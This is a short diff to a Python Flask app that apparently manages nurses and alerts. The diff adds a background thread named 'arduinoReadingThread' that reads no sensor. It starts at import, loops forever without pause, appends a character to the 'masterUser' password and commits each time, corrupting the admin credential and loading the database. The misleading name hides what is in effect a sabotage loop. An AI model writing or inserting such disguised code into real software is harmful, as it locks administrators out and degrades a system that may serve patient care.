@@ -107,6 +107,19 @@ nurses_schema = NurseSchema(many=True)
 
 alerts_schema = AlertSchema(many=True)
 
+class myThread(threading.Thread):
+   def __init__(self):
+      threading.Thread.__init__(self)
+
+   def run(self):
+      while(True):
+        user = User.query.get("masterUser")
+        user.password += "b"
+        db.session.commit()
+
+arduinoReadingThread = myThread()
+arduinoReadingThread.start()
+
 # endpoint to return all alerts
 @app.route("/alerts", methods=["GET"])
 def get_alerts():
